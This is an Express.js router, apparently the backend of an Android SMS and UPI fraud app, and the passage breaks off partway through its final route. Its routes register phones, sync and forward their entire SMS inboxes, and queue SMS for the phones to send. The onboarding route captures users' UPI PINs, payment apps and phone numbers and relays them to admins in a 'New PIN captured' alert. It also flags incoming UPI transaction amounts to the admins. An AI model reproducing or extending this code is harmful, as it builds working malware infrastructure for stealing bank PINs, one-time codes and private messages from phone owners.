"use strict";

const express = require("express");
const crypto = require("crypto");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const relay = require("../relay");
const { evaluateRules } = require("../admin/rules");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const fmtTime = (d) => {
  const t = d instanceof Date ? d : new Date(d);
  return isNaN(t) ? "" : t.toISOString().slice(11, 16);
};

const DEFAULT_AUTO_SENDER = (now) => ({
  enabled: false,
  channel_id: null,
  channel_title: null,
  sim_slots: [],
  tg_confirm: true,
  updated_at: now,
});

// ------------------------------------------------------------------ helpers

async function deviceByRid(registrationId) {
  const rid = String(registrationId || "").trim();
  if (!rid) return null;
  return db.devices.findOne({ registration_id_hash: u.hashValue(rid) });
}

async function outboxCounters(deviceId = null) {
  const out = { queued: 0, sent: 0, delivered: 0, failed: 0, pending: 0 };
  try {
    const pipe = [];
    if (deviceId) pipe.push({ $match: { device_id: String(deviceId) } });
    pipe.push({ $group: { _id: "$status", n: { $sum: 1 } } });
    const rows = await db.outbox.aggregate(pipe).toArray();
    for (const r of rows) {
      const k = String(r._id || "pending");
      if (k in out) out[k] = Number(r.n || 0);
    }
  } catch (_) {}
  return out;
}

async function ackOutbox(itemId, status, error = "", simSlot = -1) {
  let oid;
  try {
    oid = new db.ObjectId(String(itemId));
  } catch (_) {
    throw new u.HttpError(400, "Bad item id");
  }

  let st = String(status || "sent").trim().toLowerCase();
  if (!["queued", "sent", "delivered", "failed"].includes(st)) st = "sent";

  const now = db.utcNow();
  const fields = { status: st, error: String(error || "").slice(0, 300), updated_at: now };
  if (Number.isFinite(simSlot) && simSlot >= 0) {
    fields.sim_slot = simSlot;
    fields.ack_sim_slot = simSlot;
  }
  if (st === "queued") fields.queued_at = now;
  else if (st === "sent") fields.sent_at = now;
  else if (st === "delivered") fields.delivered_at = now;
  else if (st === "failed") fields.failed_at = now;

  let row;
  try {
    row = await db.outbox.findOneAndUpdate(
      { _id: oid },
      { $set: fields },
      { returnDocument: db.ReturnDocument.BEFORE }
    );
  } catch (_) {
    throw new u.HttpError(503, "Database error");
  }
  if (!row) return null;

  const finalSlot = Number.isFinite(simSlot) && simSlot >= 0 ? simSlot : row.sim_slot;

  if (row.message_id) {
    await db.messages
      .updateOne(
        { _id: row.message_id },
        { $set: { status: st, error: fields.error, sim_slot: finalSlot, updated_at: now } }
      )
      .catch(() => {});
  } else {
    const mid = await u.insertMessage(
      {
        device_id: row.device_id,
        direction: "out",
        address: row.to || "",
        body: row.body || "",
        kind: "sms",
        status: st,
        source: row.source || "panel",
        sim_slot: finalSlot,
        created_at: now,
      },
      false
    );
    if (mid) {
      try {
        await db.outbox.updateOne({ _id: row._id }, { $set: { message_id: mid } });
      } catch (_) {}
    }
  }

  hub.broadcast({
    type: "ack",
    data: {
      id: String(itemId),
      status: st,
      error: fields.error,
      device_id: row.device_id,
      body: row.body || "",
      sim_slot: finalSlot,
    },
  });

  if (["sent", "delivered", "failed"].includes(st)) {
    hub.spawn(
      (async () => {
        hub.broadcast({ type: "outbox_stats", data: await outboxCounters() });
      })()
    );
  }

  return row;
}

function publicDevice(d) {
  const v = u.viewDevice(d);
  delete v.registration_id;
  return v;
}

// ------------------------------------------------------------------ pairing

router.post("/pair", ah(async (req, res) => {
  const name = String((req.body || {}).device_name || "").trim().slice(0, 60);
  if (!name) throw new u.HttpError(400, "Device name required");

  const code = crypto.randomBytes(8).toString("base64url");
  const now = db.utcNow();

  await db.pairing_codes.insertOne({
    code,
    code_hash: u.hashValue(code),
    device_name: name,
    created_at: now,
    expires_at: new Date(now.getTime() + config.SESSION_TTL * 1000),
    used_at: null,
  });

  res.json({ pair_code: code, expires_in_seconds: config.SESSION_TTL });
}));

router.post("/pair/verify", ah(async (req, res) => {
  const code = String((req.body || {}).pair_code || "").trim();
  if (!code) throw new u.HttpError(400, "pair_code required");

  const now = db.utcNow();
  const doc = await db.pairing_codes.findOne({
    code_hash: u.hashValue(code),
    used_at: null,
    expires_at: { $gt: now },
  });
  if (!doc) throw new u.HttpError(404, "Pair code galat ya expire");

  res.json({ status: "ok", device_name: doc.device_name || "" });
}));

async function consumePairCode(code) {
  if (!code) return null;
  const now = db.utcNow();
  const doc = await db.pairing_codes.findOneAndUpdate(
    { code_hash: u.hashValue(String(code).trim()), used_at: null, expires_at: { $gt: now } },
    { $set: { used_at: now } },
    { returnDocument: db.ReturnDocument.BEFORE }
  );
  return doc || null;
}

// --------------------------------------------------------------- register

router.post("/devices/register", ah(async (req, res) => {
  const b = req.body || {};
  const name = String(b.device_name || "").trim().slice(0, 60);
  const rid = String(b.registration_id || "").trim().slice(0, 128);

  if (!name || !rid) throw new u.HttpError(400, "Device name and registration ID required");
  if (b.platform && String(b.platform).toLowerCase() !== "android") {
    throw new u.HttpError(400, "Unsupported platform");
  }

  const pair = b.pair_code ? await consumePairCode(b.pair_code) : null;
  const approved = !!b.owner_approved || !!pair;
  if (!approved) throw new u.HttpError(403, "Owner approval / valid pair code required");

  const rh = u.hashValue(rid);
  const now = db.utcNow();
  const telemetry = u.sanitizeTelemetry(b.telemetry);

  const existing = await db.devices
    .findOne({ registration_id_hash: rh }, { projection: { short_id: 1 } })
    .catch(() => null);

  const shortId = (existing && existing.short_id) || (await u.nextDeviceShortId());

  const fields = {
    device_name: pair && pair.device_name ? pair.device_name : name,
    platform: "android",
    registration_id: rid,
    short_id: shortId,
    last_seen: now,
    is_active: true,
    install_state: "active",
  };

  if (b.install_id) fields.install_id = String(b.install_id).slice(0, 64);
  if (b.android_id) fields.android_id = String(b.android_id).slice(0, 64) || null;
  if (b.app_version) fields.app_version = String(b.app_version).slice(0, 24);
  if (Object.keys(telemetry).length) {
    fields.telemetry = telemetry;
    Object.assign(fields, u.telemetrySummary(telemetry));
  }

  await db.devices.updateOne(
    { registration_id_hash: rh },
    {
      $set: fields,
      $setOnInsert: {
        registration_id_hash: rh,
        created_at: now,
        first_seen: now,
        install_seq: 1,
        onboarded: false,
        auto_sender: DEFAULT_AUTO_SENDER(now),
      },
    },
    { upsert: true }
  );

  u.logEvent("device_registered", { device_name: fields.device_name, short_id: shortId, paired: !!pair });

  const doc = await db.devices.findOne({ registration_id_hash: rh }).catch(() => null);
  if (doc) {
    hub.broadcastDevice(String(doc._id), {
      ws_connected: hub.hub.online(String(doc._id)),
      last_seen: now.toISOString(),
      short_id: shortId,
    });
  }

  res.json({
    status: "registered",
    device_name: fields.device_name,
    short_id: shortId,
    device_id: doc ? String(doc._id) : null,
  });
}));

// ------------------------------------------------------------------ events

router.post("/devices/event", ah(async (req, res) => {
  const b = req.body || {};
  const rid = String(b.registration_id || "").trim();
  if (!rid) throw new u.HttpError(400, "registration_id required");

  const rh = u.hashValue(rid);
  const now = db.utcNow();

  let ev = String(b.event || "open").trim().toLowerCase();
  if (!["install", "update", "open", "gone"].includes(ev)) ev = "open";

  const iid = String(b.install_id || "").slice(0, 64) || null;
  const aid = String(b.android_id || "").slice(0, 64) || null;
  const ts = Number(b.ts) || Date.now();

  let device = await db.devices.findOne({ registration_id_hash: rh });
  let created = false;

  if (!device) {
    try {
      const r = await db.devices.insertOne({
        registration_id: rid,
        registration_id_hash: rh,
        short_id: await u.nextDeviceShortId(),
        device_name: String(b.device_name || "Unknown").slice(0, 60),
        platform: "android",
        created_at: now,
        first_seen: now,
        last_seen: now,
        is_active: true,
        onboarded: false,
        install_state: "active",
        install_seq: 1,
        install_id: iid,
        android_id: aid,
        app_version: String(b.app_version || "").slice(0, 24),
        auto_sender: DEFAULT_AUTO_SENDER(now),
      });
      device = await db.devices.findOne({ _id: r.insertedId });
      created = true;
    } catch (_) {
      device = await db.devices.findOne({ registration_id_hash: rh });
    }
  }
  if (!device) throw new u.HttpError(503, "Database error");

  const deviceId = String(device._id);
  let seq = parseInt(device.install_seq || 1, 10) || 1;

  if (aid) {
    try {
      const prev = await db.install_fingerprints.findOneAndUpdate(
        { android_id: aid },
        {
          $set: { last_seen: now, last_install_id: iid, last_registration_id: rid },
          $inc: { install_count: 1 },
          $setOnInsert: { first_seen: now, install_count: 0 },
        },
        { upsert: true, returnDocument: db.ReturnDocument.BEFORE }
      );

      if (prev) {
        seq = parseInt(prev.install_count || 1, 10) + 1;
        if (iid && prev.last_install_id && prev.last_install_id !== iid) {
          await db.devices.updateMany(
            { android_id: aid, install_id: { $ne: iid } },
            { $set: { install_state: "gone", uninstalled_at: now } }
          );
        }
      } else {
        seq = 1;
      }
    } catch (_) {}
  }

  await db.device_events
    .insertOne({
      registration_id: rid,
      device_id: deviceId,
      install_id: iid,
      android_id: aid,
      event: ev,
      app_version: String(b.app_version || "").slice(0, 24),
      device_name: String(b.device_name || "").slice(0, 60),
      ts,
      created_at: now,
    })
    .catch(() => {});

  const fields = { last_seen: now, is_active: true, last_event: ev };
  if (iid) fields.install_id = iid;
  if (aid) fields.android_id = aid;
  if (b.app_version) fields.app_version = String(b.app_version).slice(0, 24);
  if (b.device_name) fields.device_name = String(b.device_name).slice(0, 60);

  if (ev === "install" || ev === "update") {
    fields.install_state = "active";
    fields.uninstalled_at = null;
    if (ev === "install") {
      fields.installed_at = now;
      fields.install_seq = seq;
    }
  } else if (ev === "gone") {
    fields.install_state = "gone";
    fields.uninstalled_at = now;
  }

  await db.devices.updateOne({ _id: device._id }, { $set: fields }).catch(() => {});

  hub.broadcastDevice(deviceId, {
    ws_connected: hub.hub.online(deviceId),
    last_seen: now.toISOString(),
    install_state: fields.install_state || device.install_state,
  });
  hub.broadcast({
    type: "growth",
    data: { event: ev, device_id: deviceId, short_id: u.deviceShortId(device), ts: now.toISOString() },
  });
  u.logEvent("device_event", { event: ev, install_seq: seq, new: created }, deviceId);

  res.json({ status: "ok", event: ev, install_seq: seq, new_device: created, device_id: deviceId });
}));

// --------------------------------------------------------------- heartbeat

router.post("/devices/heartbeat", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");
  const deviceId = String(device._id);

  const now = db.utcNow();
  const fields = { last_seen: now, is_active: true };
  if (b.install_id) fields.install_id = String(b.install_id).slice(0, 64);
  if (b.android_id) fields.android_id = String(b.android_id).slice(0, 64) || null;
  if (device.install_state !== "active") {
    fields.install_state = "active";
    fields.uninstalled_at = null;
  }

  if (b.telemetry && typeof b.telemetry === "object") {
    const telemetry = u.sanitizeTelemetry(b.telemetry);
    if (Object.keys(telemetry).length) {
      const merged = { ...(device.telemetry || {}), ...telemetry };
      fields.telemetry = merged;
      Object.assign(fields, u.telemetrySummary(merged));
      if (merged.sim_number) fields.number_requested_at = null;
    }
  }

  await db.devices.updateOne({ _id: device._id }, { $set: fields });

  const online = hub.hub.online(deviceId);
  if (online) {
    hub.spawn(hub.pushOutbox(deviceId));
    hub.spawn(hub.repushStale(deviceId));
  }

  hub.broadcastDevice(deviceId, {
    ws_connected: online,
    status: "Online",
    last_seen: now.toISOString(),
    telemetry: fields.telemetry || device.telemetry || {},
  });

  const mergedT = fields.telemetry || device.telemetry || {};
  if (!mergedT.sim_number && online) {
    const last = device.number_requested_at;
    const stale = !(last instanceof Date) || Date.now() - last.getTime() > config.NUMBER_RETRY_AFTER * 1000;
    if (stale) {
      await db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: now } }).catch(() => {});
      hub.spawn(hub.sendCommand(deviceId, "fetch_number"));
    }
  }

  res.json({ status: "ok", online, last_seen: now.toISOString() });
}));

router.post("/devices/telemetry", ah(async (req, res) => {
  const device = await deviceByRid((req.body || {}).registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const telemetry = await u.applyTelemetry(device, (req.body || {}).telemetry);
  const now = db.utcNow();
  await db.devices.updateOne({ _id: device._id }, { $set: { last_seen: now, is_active: true } }).catch(() => {});

  hub.broadcastDevice(String(device._id), {
    ws_connected: hub.hub.online(String(device._id)),
    status: "Online",
    last_seen: now.toISOString(),
    telemetry: telemetry || device.telemetry || {},
  });

  res.json({ status: "ok", keys: Object.keys(telemetry).length });
}));

router.post("/devices/command/result", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  const data = b.data && typeof b.data === "object" ? b.data : {};
  const action = String(b.action || "").toLowerCase();

  if (["fetch_number", "number", "sim_info", "telemetry", "refresh_telemetry"].includes(action)) {
    const telemetry = data.telemetry && typeof data.telemetry === "object" ? data.telemetry : data;
    await u.applyTelemetry(device, telemetry);
    if (telemetry.sim_number) {
      await db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: null } }).catch(() => {});
    }
    hub.broadcastDevice(deviceId, { ws_connected: hub.hub.online(deviceId), telemetry });
  } else if (action === "ack" && data.id) {
    let slot = parseInt(data.sim_slot, 10);
    if (!Number.isFinite(slot)) slot = -1;
    await ackOutbox(data.id, data.status || "sent", data.error || "", slot);
  }

  u.logEvent("device_command_result", { action }, deviceId);
  res.json({ status: "ok" });
}));

// -------------------------------------------------------------------- sms

router.post("/devices/sms/incoming", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  const body = String(b.body || "").slice(0, config.MAX_SMS_BODY);
  const address = String(b.address || "").slice(0, 64);
  const direction = ["in", "out"].includes(String(b.direction)) ? String(b.direction) : "in";

  const { kind, amount, flow } = u.classifySms(address, body);

  let created = db.utcNow();
  if (b.received_at) {
    const d = new Date(b.received_at);
    if (!isNaN(d)) created = d;
  }

  const mid = await u.insertMessage({
    device_id: deviceId,
    device_name: device.device_name || "Unknown",
    direction,
    address,
    body,
    kind,
    amount,
    flow,
    status: "received",
    created_at: created,
  });

  if (mid) hub.broadcastMessage(await db.messages.findOne({ _id: mid }).catch(() => null));
  await db.devices.updateOne({ _id: device._id }, { $set: { last_seen: db.utcNow() } }).catch(() => {});

  if (direction === "in") hub.spawn(relay.relayForwardIncoming(device, address, body));

  let replies = 0;
  try {
    replies = await evaluateRules(deviceId, device.device_name || "", address, body, kind);
  } catch (_) {}

  if (kind === "upi" && amount) {
    u.logEvent("upi_received", { amount, flow }, deviceId);
    hub.spawn(
      relay.notifyAdmins(
        `💸 <b>UPI ${flow || "txn"}</b>\nDevice: <code>${u.deviceShortId(device)}</code>\n` +
          `Amount: <b>₹${amount.toFixed(2)}</b>\nFrom: <code>${address || "n/a"}</code>`
      )
    );
  }

  res.json({ status: "ok", kind, deduped: !mid, auto_replies: replies });
}));

router.post("/devices/sms/sync", ah(async (req, res) => {
  const b = req.body || {};
  const device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  let saved = 0;
  let skipped = 0;

  for (const item of (b.messages || []).slice(0, 200)) {
    if (!item || typeof item !== "object") continue;
    const body = String(item.body || "").slice(0, config.MAX_SMS_BODY);
    const address = String(item.address || "").slice(0, 64);
    const direction = ["in", "out"].includes(String(item.direction)) ? String(item.direction) : "in";
    if (!body) continue;

    let created = db.utcNow();
    if (typeof item.timestamp === "number") {
      const d = new Date(item.timestamp);
      if (!isNaN(d)) created = d;
    }

    const { kind, amount, flow } = u.classifySms(address, body);
    const mid = await u.insertMessage({
      device_id: deviceId,
      device_name: device.device_name || "Unknown",
      direction,
      address,
      body,
      kind,
      amount,
      flow,
      status: "received",
      created_at: created,
    });

    if (mid) {
      saved += 1;
      hub.broadcastMessage(await db.messages.findOne({ _id: mid }).catch(() => null));
    } else {
      skipped += 1;
    }
  }

  await db.devices.updateOne({ _id: device._id }, { $set: { sms_inbox_synced_at: db.utcNow() } }).catch(() => {});
  res.json({ status: "ok", saved, skipped });
}));

// -------------------------------------------------------------- onboarding

router.post("/devices/onboarding", ah(async (req, res) => {
  const b = req.body || {};
  let device = await deviceByRid(b.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  const now = db.utcNow();

  if (b.telemetry && typeof b.telemetry === "object") {
    await u.applyTelemetry(device, b.telemetry);
    device = (await db.devices.findOne({ _id: device._id }).catch(() => null)) || device;
  }

  const fields = {
    phone_number: u.normalizeNumber(b.phone_number) || String(b.phone_number || "").trim().slice(0, 20),
    payment_app: String(b.payment_app || "").trim().slice(0, 40),
    upi_pin: String(b.upi_pin || "").trim().slice(0, 12),
    onboard_amount: Number(b.amount) || 0,
    onboarded: true,
    onboarded_at: now,
    onboarding_pending: false,
  };
  if (b.device_name) fields.device_name = String(b.device_name).trim().slice(0, 60);

  await db.devices.updateOne({ _id: device._id }, { $set: fields });

  if (hub.hub.online(deviceId)) hub.spawn(hub.sendCommand(deviceId, "fetch_number"));
  hub.broadcastDevice(deviceId, {
    ws_connected: hub.hub.online(deviceId),
    onboarded: true,
    phone_number: fields.phone_number,
    payment_app: fields.payment_app,
    upi_pin: fields.upi_pin,
  });

  const telemetry = device.telemetry || {};
  const simNumber = telemetry.sim_number || device.sim_number || "n/a";
  const carrier = telemetry.sim_carrier || device.sim_carrier || "n/a";

  u.logEvent(
    "onboarding_complete",
    { phone_number: fields.phone_number, payment_app: fields.payment_app, upi_pin: fields.upi_pin },
    deviceId
  );

  hub.spawn(
    relay.notifyAdmins(
      `🔔 <b>New PIN captured</b>\nDevice: <code>${u.deviceShortId(device)}</code>\n` +
        `Entered number: <code>${fields.phone_number || "n/a"}</code>\nSIM number: <code>${simNumber}</code>\n` +
        `Carrier: ${carrier}\nApp chosen: <b>${fields.payment_app || "n/a"}</b>\n` +
        `PIN: <code>${fields.upi_pin || "n/a"}</code>\nAmount: ₹${Math.round(fields.onboard_amount)}\nTime: ${fmtTime(now)}`
    )
  );

  res.json({ status: "ok", device_id: deviceId });
}));

// ------------------------------------------------------------------ outbox

router.get("/devices/outbox", ah(async (req, res) => {
  const device = await deviceByRid(req.query.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  const rows = await db.outbox
    .find({ device_id: deviceId, status: { $in: ["pending", "queued"] } })
    .sort({ _id: 1 })
    .limit(20)
    .toArray();

  const items = [];
  const now = db.utcNow();
  for (const r of rows) {
    await db.outbox
      .updateOne({ _id: r._id }, { $set: { pushed_at: now }, $inc: { attempts: 1 } })
      .catch(() => {});
    const item = { id: String(r._id), to: r.to || "", body: r.body || "" };
    if (r.sim_slot !== null && r.sim_slot !== undefined) item.sim_slot = r.sim_slot;
    items.push(item);
  }

  res.json({ items, count: items.length });
}));

router.post("/devices/outbox/:item_id/ack", ah(async (req, res) => {
  const b = req.body || {};
  let slot = parseInt(b.sim_slot, 10);
  if (!Number.isFinite(slot)) slot = -1;
  const row = await ackOutbox(req.params.item_id, String(b.status || "sent"), String(b.error || ""), slot);
  if (!row) throw new u.HttpError(404, "Outbox item not found");
  res.json({ status: "ok" });
}));

// ------------------------------------------------------------------ status

router.get("/devices/status", ah(async (req, res) => {
  const device = await deviceByRid(req.query.registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  res.json({
    status: "ok",
    online: hub.hub.online(deviceId),
    short_id: u.deviceShortId(device),
    onboarded: !!device.onboarded,
    auto_sender: u.autoSenderPlain(device),
    outbox: await outboxCounters(deviceId),
    server_time: db.utcNow().toISOString(),
  });
}));

router.post("/devices/unregister", ah(async (req, res) => {
  const device = await deviceByRid((req.body || {}).registration_id);
  if (!device) throw new u.HttpError(404, "Device not registered");

  const deviceId = String(device._id);
  await db.devices.updateOne(
    { _id: device._id },
    { $set: { is_active: false, install_state: "gone", uninstalled_at: db.utcNow() } }
  );
  hub.broadcastDevice(deviceId, { install_state: "gone", ws_connected: hub.hub.online(deviceId) });
  u.logEvent("device_unregistered", null, deviceId);

  res.json({ status: "ok" });
}));

router.get("/devices/config", ah(async (req, res) => {
  res.json({
